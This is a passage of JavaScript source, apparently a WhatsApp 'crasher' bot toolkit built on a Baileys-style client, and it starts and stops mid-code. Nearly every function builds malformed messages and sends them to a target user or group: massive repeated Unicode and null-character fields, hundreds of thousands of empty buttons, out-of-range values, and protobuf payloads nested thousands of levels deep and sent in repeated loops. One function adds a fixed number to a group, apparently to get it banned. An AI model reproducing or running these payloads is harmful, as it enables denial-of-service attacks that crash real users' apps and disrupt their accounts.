                        }]
                    }]
                });
                totalSent++;
            }
        }

        console.log(`? Batch ${batchNum}/${totalBatches} done`);
    }

    console.log(`? Done! Total: ${totalSent} messages`);
    if (!totalSent) throw new Error('Function Error');
}

async function BlankGroupEraV1(sock, groupJid) {
    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Skylinne - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(groupJid, LexzyExe, {});

    await sock.relayMessage(groupJid, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    await sock.relayMessage(groupJid, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(75000),
            publisher: "Skylinne - Executed¿!" + "ꦾ".repeat(5000),
            stickers: [],
            fileLength: "366299919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135555555@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "9990099",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});

    await sock.relayMessage(
        groupJid,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "GhostCrasher",
                            locationMessage: {
                                degreesLatitude: -999.03499999999999,
                                degreesLongitude: 922.9999999999999,
                                name: "Skylinne",
                                address: "X",
                                jpegThumbnail: null,
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: "Skylinne - Executed¿!",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "address_message",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "ြ ".repeat(75000),
                                },
                            ],
                            messageParamsJson: "wa.me/stickerpack/Skylinnereal",
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(groupJid, {
        groupStatusMessageV2: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    caption: "LexzyMods - Executed¿!",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                    annotations: [
                        {
                            polygonVertices: [
                                {
                                    x: 0.17499999701976776,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.6620468497276306
                                },
                                {
                                    x: 0.17499999701976776,
                                    y: 0.6620468497276306
                                }
                            ],
                            shouldSkipConfirmation: true,
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "2261401457948346",
                                    songId: "849859527815275",
                                    author: "Skylinnereal - Executed¿!" + "ြ".repeat(9000),
                                    title: "ြ".repeat(75000),
                                    artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                    artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                    artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                    artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                    artistAttribution: "https://www.instagram.com/_u/lexzymods",
                                    countryBlocklist: "WEs=",
                                    isExplicit: false
                                }
                            },
                            embeddedAction: true
                        }
                    ]
                }
            }
        }
    }, {});

    const bot = "867051314767696@bot";

    await sock.relayMessage(groupJid, {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,

                    submessages: [
                        {
                            messageType: 2,
                            messageText: `@${bot.split("@")[0]}`
                        },

                        {
                            messageType: 5,
                            codeMetadata: {
                                codeLanguage: "javascript",

                                codeBlocks: [
                                    {
                                        highlightType: 1,
                                        codeContent: "const = {"
                                    },
                                    {
                                        highlightType: 2,
                                        codeContent: "Skylinne - Executed¿!"
                                    },
                                    {
                                        highlightType: 3,
                                        codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
                                    }
                                ]
                            }
                        }
                    ],

                    contextInfo: {
                        mentionedJid: [bot],

                        featureEligibilities: Array.from(
                            { length: 1999 },
                            () => ({
                                canReceiveMultiReact: true
                            })
                        ),

                        isForwarded: true,

                        forwardedAiBotMessageInfo: {
                            botJid: bot
                        },

                        forwardOrigin: 4
                    }
                }
            }
        }
    }, {});

    const Iniochamy = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "Skylinne - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999987899999999999999,
                                998999999999999999999,
                                999899999999999999999,
                                9998789999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "Skylinne - Executed¿!",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 450000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Iniochamyy = generateWAMessageFromContent(groupJid, Iniochamy, {});

    await sock.relayMessage(groupJid, Iniochamyy.message, {
        participant: target,
        messageId: Iniochamyy.key.id
    });
}

async function boomber(sock, target) {
  const msg = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: 'Helloo'.repeat(8000) },
          nativeFlowMessage: {
            name: 'cta_flow',
            version: 3,
            buttons: [
              {
                name: 'quick_reply',
                buttonParamsJson: JSON.stringify({
                  display_text: 'u0000'.repeat(30000),
                  id: 'u600b'.repeat(30000),
                }),
              },
            ],
          },
        },
      },
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
      },
    },
  };
  await sock.relayMessage(target, msg, {
    messageId: null,
  });
}

async function CrashXfrezer(sock, target) {
    try {
        await sock.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "‼️⃟By Skylinne",
                            hasMediaAttachment: false
                        },
                        body: {
                            text: "҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(100000) + "‼️⃟By Skylinne".repeat(5000),
                            format: "DEFAULT"
                        },
                        footer: {
                            text: "҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(50000)
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 15000 }, () => Math.floor(Math.random() * 99999999999) + "@s.whatsapp.net"),
                            isForwarded: true,
                            forwardingScore: 999999999
                        },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: JSON.stringify({ title: "҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(10000) }) },
                                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "‼️⃟By Skylinne".repeat(5000), id: null }) }
                            ],
                            messageParamsJson: "}".repeat(150000),
                            messageVersion: 3
                        }
                    }
                }
            }
        }, { participant: { jid: target } })
        console.log(`✅ SUKSES`)
    } catch (err) {
        console.log(`❌ EROR`)
    }
}

async function PayXGroup(sock, target) {
await sock.relayMessage(target, {
  interactiveMessage: {
   body: { text: "- # GhostCrash3r ん.? " },
    nativeFlowMessage: {
     buttons: [
       {
         name: "review_and_pay",
         buttonParamsJson: `{"reference_id":"${"𑇂".repeat(50000)}","currency":"IDR","total_amount":{"value":150000,"offset":100},"order":{"status":"pending","subtotal":{"value":120000,"offset":100},"tax":{"value":30000,"offset":100},"items":[{"name":"${"\0".repeat(9000)}","amount":{"value":12000000,"offset":100},"quantity":1000}]}}`
       }
     ], 
      messageParamsJson: JSON.stringify({
       limited_time_offer: {
        text: "kontol",
        url: "https://t.me/ghostcrasher18",
        copy_code: "- # GhostCrash3r ん.? ",
        expiration_time: Date.now() * 10000
        },
        tap_target_configuration: {
         title: "- # GhostCrash3r ん.? ",
         description: "- # GhostCrash3r ん.? ",
         canonical_url: "https://t.me/ghostcrasher18",
         domain: "https://t.me/ghostcrasher18",
         button_index: 0
        },
      })
    }
  }
}, {
   participant: false
})
}

async function BlankBYHeksen(sock, target) {
 const  Msg = {
 albumMessage: {
      expectedImageCount: 999999,
      expectedVideoCount: 999999,
      contextInfo: {
        quotedMessage: {
          imageMessage: {
            caption: "\u001C".repeat(100000),
            fileLength: 999999999,
            height: 9999,
            width: 9999,
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgUVJT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6aZz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, Msg, {});
  console.log("hello, world");
}

async function k7force1msg(sock, target) {
while (Date.now() - Date.now() < 200000) {
const IMG = {
  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
  directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
   mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
   fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
   fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
   fileLength: 20010,
   mediaKeyTimestamp: "1785637793",
   mimetype: "image/jpeg",
   height: 1600,
   width: 1200,
   jpegThumbnail: ""
 };

 const TAGS = [
  [0xBA, 0x03],
  [0xD2, 0x04],
  [0xAA, 0x02],
 ];

const encodeVarint = function(n) {
  var buf = [];
  while (n >= 0x80) {
   buf.push((n & 0x7f) | 0x80);
   n >>>= 7;
  }
  buf.push(n);
  return Buffer.from(buf);
 };

const wrapLd = function(tag, data) {
 return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
};

const basePayload = proto.Message.encode(
proto.Message.fromObject({ imageMessage: IMG })
).finish();

const inflate = function(tag, depth) {
var buf = basePayload;
for (var i = 0; i < depth; i++) {
buf = wrapLd(tag, wrapLd([0x0A], buf));
}
return buf;
};

const resolveJid = function(raw) {
var s = String(raw || '').trim();
if (s.includes('@')) return s;
return s.replace(/\D/g, '') + '@s.whatsapp.net';
};

const jids = (Array.isArray(target) ? target : [target])
.map(resolveJid)
.filter(function(j) { return j.length > 15; });

if (!jids.length) return;

var MAX_BATCH = 5;
var totalSent = 0;

for (var i = 0; i < 900; i++) {
for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
var chunk = jids.slice(offset, offset + MAX_BATCH);

for (var ti = 0; ti < TAGS.length; ti++) {
var tag = TAGS[ti];
var payload = null;

for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
try {
var decoded = proto.Message.decode(inflate(tag, depth));
proto.Message.encode(decoded).finish();
payload = decoded;
} catch (_) {}
}

if (!payload) continue;

var msgId = 'skylinne' + Date.now().toString(36).toUpperCase() + '_' + i + '_' + offset;

try {
await sock.relayMessage('status@broadcast', payload, {
messageId: msgId, statusJidList: chunk, additionalNodes: [{
  tag: 'meta', attrs: {}, content: [{
    tag: 'mentioned_users', attrs: {}, content: chunk.map(function(target) {
            return { tag: 'to', attrs: { jid: target }, content: [] };
           })
         }]
       }]
     });
     totalSent++;
     } catch (_) {}
         await new Promise(function(r) { setTimeout(r, 1000); });
        }
      }
    }
  }
}

async function LexcaabosFast(sock, target, durationHours = 500) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const Payload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = Payload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    var MAX_BATCH = 1;
    var DELAY_MS = 1000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var bokep = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('n' + idx) : 'n';
        var msg = 'Ghost' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag = TAGS[ti];
            var ampasx = null;

            for (var depth = 5000; depth >= 2000 && !ampasx; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    ampasx = decoded;
                } catch (_) {}
            }

            if (!ampasx) continue;

            await sock.relayMessage('status@broadcast', ampasx, {
                messageId: msg,
                statusJidList: bokep,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: bokep.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });
        }
    }
}

async function fc(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const Payload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = Payload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });


    var MAX_BATCH = 1;
    var DELAY_MS  = 1000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var bokep   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('n' + idx) : 'n';
        var msg  = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var ampasx = null;

            for (var depth = 5000; depth >= 2000 && !ampasx; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    ampasx = decoded;
                } catch (_) {}
            }

            if (!ampasx) continue;

            await sock.relayMessage('status@broadcast', ampasx, {
                messageId: msg,
                statusJidList: bokep,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: bokep.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });
        }
    }
}

async function test(sock, target) {
const ziy = {
interactiveMessage: {
header: { title: "Skylinne" },
            body: { text: "p woii:" },
            footer: { text: "© main yok" },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\u300b",
                            id: "📌"
                        })
                    },
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\u600b",
                            url: "https://t.me/Skylinnereal",
                            merchant_url: "https://t.me/Skylinnereal"
                        })
                    },
                    {
                        name: "cta_call",
                        buttonParamsJson: JSON.stringify({
                            display_text: "000000000000000",
                            id: "message"
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\u0000".repeat(50000) + "\u0600".repeat(50000),
                            id: "\u200b".repeat(50000 ),
                            copy_code: "#Skylinne"
                        })
                    }
                ]
            }
        }
    };
await sock.relayMessage(target, ziy,{});
console.log("test uyy");
}

async function iosCtt(sock, target) {
  await sock.relayMessage(target, {
    contactMessage: {
      displayName:
        "🎭⃟༑⌁⃰CrashIosAmpos🐉" +
        "𑇂𑆵𑆴𑆿".repeat(10000),
      vcard: `BEGIN:VCARD
VERSION:3.0
N:;𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)};;;
FN:𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)}
NICKNAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
ORG:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
TITLE:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item1.TEL;waid=6287873499996:+62 878-7349-9996
item1.X-ABLabel:Telepon
item2.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item2.X-ABLabel:Kantor
item3.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item3.X-ABLabel:Kantor
item4.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item4.X-ABLabel:Pribadi
item5.ADR:;;𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)};;;;
item5.X-ABADR:ac
item5.X-ABLabel:Rumah
X-YAHOO;type=KANTOR:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
PHOTO;${null}
X-WA-BIZ-NAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
END:VCARD`,
      contextInfo: {
        externalAdReply: {
          automatedGreetingMessageShown: true,
          automatedGreetingMessageCtaType: "\u0000".repeat(100000),
          greetingMessageBody: "TheEnd",
        },
      },
    },
  }, {
    participant: { jid: target },
  });
}

async function BanGroupNew(sock, groupJid) {
  if (!groupJid.endsWith('@g.us')) {
    throw new Error('@g.us server required');
  }

  let group = groupJid;

  try {
    await sock.groupParticipantsUpdate(
      group,
      ['18188880008@s.whatsapp.net'],
      'add',
    );

    await sock.sendPresenceUpdate('composing', group);
  } catch (err) {
    console.error('error:', err);
    throw err;
  }
}

async function comboxC1(sock, target) {
  try {
    const m = "\u0000".repeat(5000000) + "ꦾ".repeat(3000000) + "\uDBFF\uDFFF".repeat(1000000);
    
    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: m.substring(0, 200000) },
            footer: { text: m.substring(0, 100000) },
            header: {
              title: m.substring(0, 150000),
              hasMediaAttachment: true,
              locationMessage: {
                degreesLatitude: -999999.999999,
                degreesLongitude: 999999.999999,
                name: m.substring(0, 150000),
                address: m.substring(0, 150000)
              }
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: JSON.stringify({ title: m.substring(0, 50000) }) },
                { name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
                { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: m.substring(0, 50000) }) }
              ],
              messageParamsJson: "{".repeat(200000)
            },
            carouselMessage: {
              cards: Array.from({ length: 100 }, (_, i) => ({
                header: {
                  title: m.substring(0, 30000) + i,
                  hasMediaAttachment: true,
                  imageMessage: {
